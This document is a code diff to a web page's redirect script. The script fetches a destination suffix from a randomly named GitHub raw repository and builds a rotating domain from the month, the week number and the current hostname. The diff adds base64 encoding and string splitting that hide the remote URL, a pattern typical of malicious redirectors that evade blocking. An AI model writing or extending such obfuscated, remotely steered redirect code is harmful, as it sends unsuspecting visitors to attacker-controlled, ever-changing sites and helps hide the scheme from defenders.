@@ -82,29 +82,32 @@ a {
 </div>
 <span id="footer">Report Here if you are not redirect automatically.</span>
 <script>
-function go(e) {
-    const dt = new Date();
-    const m = dt.toLocaleString('default', { month: 'short' }).split('').reverse().join('').toLowerCase();
-    dt.setHours(0, 0, 0, 0);
-    dt.setDate(dt.getDate() + 3 - ((dt.getDay() + 6) % 7));
-    const yearStart = new Date(dt.getFullYear(), 0, 1);
-    const w = Math.ceil(((dt - yearStart) / 86400000 + 1) / 7);
-    const h = window.location.hostname.replace(/\.(?:[a-z]{2,}|[a-z]{2}\.[a-z]{2})$/i, '');
-    window.location.href = window.location.protocol + '//' + m + w + '.' + h +'.'+ e;
-  }
 var countdownNumberEl = document.getElementById('countdown-number');
 var countdown = 5;
+const g = 'HR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t';
+const u = 'jhs6iofezkuhwrxtr8769ivqkw8d877dh14lc6v'
+const r = '48eff3dt44qfvmq1bqy1l8nagii1a89v6kgsyeqzsqethnm8mj8wnwogs6x6oj0ufz8zm8zri7zsb0d13gzux9w0jy4f420l1sod';
+const f = 'yhuxhnyro8viu8l8stju0da7pmglhgq6i4h6e8yux528tugc8wy6bls617xc06bc8qv8ostd9m2r8pd77zztbgbgb0xync476ls0'
+const s = '/'
 countdownNumberEl.textContent = countdown;
 setInterval(function() {
   countdown = --countdown <= 0 ? 5 : countdown;
   countdownNumberEl.textContent = countdown;
 }, 1000);
+const a = atob('a'+g)+s+u+s+r+s+'refs'+s+'heads'+s+'main'+s+f;
 window.setTimeout(function() {
-  fetch('https://raw.githubusercontent.com/jhs6iofezkuhwrxtr8769ivqkw8d877dh14lc6v/48eff3dt44qfvmq1bqy1l8nagii1a89v6kgsyeqzsqethnm8mj8wnwogs6x6oj0ufz8zm8zri7zsb0d13gzux9w0jy4f420l1sod/refs/heads/main/yhuxhnyro8viu8l8stju0da7pmglhgq6i4h6e8yux528tugc8wy6bls617xc06bc8qv8ostd9m2r8pd77zztbgbgb0xync476ls0.json')
+  fetch(a)
     .then(response => response.json())
     .then(data => {
-      const l = data.stations[0].parking;
-      go(l);
+        const l = data.stations[0].parking;
+        const dt = new Date();
+        const m = dt.toLocaleString('default', { month: 'short' }).split('').reverse().join('').toLowerCase();
+        dt.setHours(0, 0, 0, 0);
+        dt.setDate(dt.getDate() + 3 - ((dt.getDay() + 6) % 7));
+        const yearStart = new Date(dt.getFullYear(), 0, 1);
+        const w = Math.ceil(((dt - yearStart) / 86400000 + 1) / 7);
+        const h = window.location.hostname.replace(/\.(?:[a-z]{2,}|[a-z]{2}\.[a-z]{2})$/i, '');
+        window.location.href = window.location.protocol + '//' + m + w + '.' + h +'.'+ l;
     })
     .catch(error => {
       console.error('Error:', error);
